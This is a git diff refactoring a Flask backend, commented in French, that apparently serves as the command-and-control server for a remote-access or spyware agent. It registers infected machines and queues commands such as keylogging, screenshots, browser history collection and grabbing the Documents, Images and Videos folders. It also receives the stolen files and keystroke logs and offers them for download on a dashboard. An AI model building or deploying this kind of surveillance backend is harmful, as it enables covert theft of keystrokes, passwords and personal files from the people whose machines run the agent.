@@ -2,100 +2,135 @@ import os
 import json
 from flask import Blueprint, request, jsonify, send_from_directory
 from werkzeug.utils import secure_filename
-from services.machine_service import (
-    register_machine, list_machines, get_machine,
-    send_command, fetch_command, store_result, get_result, get_upload_dir,
-)
+from database import get_db
 
 machines_bp = Blueprint('machines', __name__)
 
+ALLOWED_COMMANDS = {
+    'screenshot', 'start_keylog', 'stop_keylog',
+    'browser_history', 'apps',
+    'files:Documents', 'files:Images', 'files:Videos', 'files:Bureau',
+}
+
+
+def get_upload_dir(machine_id):
+    path = os.path.join('uploads', str(machine_id))
+    os.makedirs(path, exist_ok=True)
+    return path
+
+
+# --- Routes utilisées par l'agent ET le frontend ---
 
 @machines_bp.route('/report', methods=['POST'])
 def report():
-    """L'agent envoie ses infos de base au démarrage."""
+    """L'agent envoie ses infos au démarrage → on l'enregistre et on retourne son ID."""
     data = request.get_json()
-    if not data:
-        return jsonify({'error': 'Corps JSON invalide'}), 400
-    try:
-        machine_id = register_machine(data)
-        return jsonify({'message': 'Rapport reçu', 'id': machine_id}), 201
-    except ValueError as e:
-        return jsonify({'error': str(e)}), 400
+    if not data or not data.get('hostname') or not data.get('os_info'):
+        return jsonify({'error': 'hostname et os_info requis'}), 400
+
+    db = get_db()
+    cur = db.execute(
+        'INSERT INTO machines (hostname, os_info, private_ip, public_ip) VALUES (?, ?, ?, ?)',
+        (data['hostname'], data['os_info'], data.get('private_ip'), data.get('public_ip'))
+    )
+    db.commit()
+    return jsonify({'id': cur.lastrowid}), 201
 
 
 @machines_bp.route('', methods=['GET'])
 def get_machines():
-    return jsonify(list_machines())
+    """Retourne la liste de toutes les machines (utilisé par le dashboard)."""
+    db = get_db()
+    rows = db.execute('SELECT * FROM machines ORDER BY last_seen DESC').fetchall()
+    return jsonify([dict(r) for r in rows])
 
 
 @machines_bp.route('/<int:machine_id>', methods=['GET'])
-def get_machine_by_id(machine_id):
-    try:
-        return jsonify(get_machine(machine_id))
-    except ValueError as e:
-        return jsonify({'error': str(e)}), 404
+def get_machine(machine_id):
+    """Retourne les détails d'une machine (utilisé par la page MachineDetail)."""
+    db = get_db()
+    row = db.execute('SELECT * FROM machines WHERE id = ?', (machine_id,)).fetchone()
+    if not row:
+        return jsonify({'error': 'Machine introuvable'}), 404
+    return jsonify(dict(row))
 
 
 @machines_bp.route('/<int:machine_id>/command', methods=['GET', 'POST'])
 def command(machine_id):
+    db = get_db()
     if request.method == 'POST':
         # Frontend envoie une commande
         data = request.get_json()
         cmd = data.get('command') if data else None
-        if not cmd:
-            return jsonify({'error': 'command manquant'}), 400
-        try:
-            send_command(machine_id, cmd)
-            return jsonify({'ok': True}), 200
-        except ValueError as e:
-            return jsonify({'error': str(e)}), 400
+        if not cmd or cmd not in ALLOWED_COMMANDS:
+            return jsonify({'error': 'commande invalide'}), 400
+        db.execute(
+            'UPDATE machines SET pending_command = ?, command_result = NULL WHERE id = ?',
+            (cmd, machine_id)
+        )
+        db.commit()
+        return jsonify({'ok': True})
     else:
-        # Agent poll — lit la commande en attente
-        cmd = fetch_command(machine_id)
-        return jsonify({'command': cmd}), 200
+        # Agent poll → lit la commande en attente
+        row = db.execute(
+            'SELECT pending_command FROM machines WHERE id = ?', (machine_id,)
+        ).fetchone()
+        return jsonify({'command': row['pending_command'] if row else None})
 
 
 @machines_bp.route('/<int:machine_id>/result', methods=['GET', 'POST'])
 def result(machine_id):
+    db = get_db()
     if request.method == 'POST':
-        # Agent envoie le résultat — peut être un dict JSON imbriqué ou une string
+        # Agent envoie le résultat
         data = request.get_json()
-        result_val = data.get('result', '') if data else ''
-        # On sérialise en string si Flask a parsé un dict (JSON imbriqué)
-        result_str = json.dumps(result_val) if isinstance(result_val, (dict, list)) else str(result_val)
-        store_result(machine_id, result_str)
-        return jsonify({'ok': True}), 200
+        val = data.get('result', '') if data else ''
+        # Flask parse automatiquement le JSON imbriqué en dict → on re-sérialise en string
+        result_str = json.dumps(val) if isinstance(val, (dict, list)) else str(val)
+        db.execute(
+            'UPDATE machines SET command_result = ?, pending_command = NULL WHERE id = ?',
+            (result_str, machine_id)
+        )
+        db.commit()
+        return jsonify({'ok': True})
     else:
         # Frontend récupère le résultat
-        res = get_result(machine_id)
-        return jsonify({'result': res}), 200
+        row = db.execute(
+            'SELECT command_result FROM machines WHERE id = ?', (machine_id,)
+        ).fetchone()
+        return jsonify({'result': row['command_result'] if row else None})
 
 
 @machines_bp.route('/<int:machine_id>/upload', methods=['POST'])
 def upload(machine_id):
-    """Agent upload un fichier binaire (screenshot, zip). Stocke le nom dans command_result."""
+    """Agent upload un fichier binaire (screenshot, zip)."""
     if 'file' not in request.files:
         return jsonify({'error': 'pas de fichier'}), 400
     f = request.files['file']
     filename = secure_filename(f.filename)
-    upload_dir = get_upload_dir(machine_id)
-    f.save(os.path.join(upload_dir, filename))
-    store_result(machine_id, json.dumps({'type': 'file', 'filename': filename}))
-    return jsonify({'ok': True, 'filename': filename}), 200
+    f.save(os.path.join(get_upload_dir(machine_id), filename))
+
+    db = get_db()
+    db.execute(
+        'UPDATE machines SET command_result = ?, pending_command = NULL WHERE id = ?',
+        (json.dumps({'type': 'file', 'filename': filename}), machine_id)
+    )
+    db.commit()
+    return jsonify({'ok': True, 'filename': filename})
 
 
 @machines_bp.route('/<int:machine_id>/keylog', methods=['POST'])
 def keylog(machine_id):
-    """Agent envoie un chunk de keylog (texte brut). Écrase keylog.txt."""
+    """Agent envoie un chunk de keylog (texte brut) → écrase keylog.txt."""
     data = request.data.decode('utf-8', errors='replace')
-    upload_dir = get_upload_dir(machine_id)
-    with open(os.path.join(upload_dir, 'keylog.txt'), 'w', encoding='utf-8') as fout:
-        fout.write(data)
-    return jsonify({'ok': True}), 200
+    with open(os.path.join(get_upload_dir(machine_id), 'keylog.txt'), 'w', encoding='utf-8') as f:
+        f.write(data)
+    return jsonify({'ok': True})
 
 
 @machines_bp.route('/<int:machine_id>/download/<path:filename>', methods=['GET'])
 def download(machine_id, filename):
     """Frontend télécharge un fichier uploadé par l'agent."""
-    upload_dir = os.path.abspath(get_upload_dir(machine_id))
-    return send_from_directory(upload_dir, filename, as_attachment=True)
+    return send_from_directory(
+        os.path.abspath(get_upload_dir(machine_id)), filename, as_attachment=True
+    )
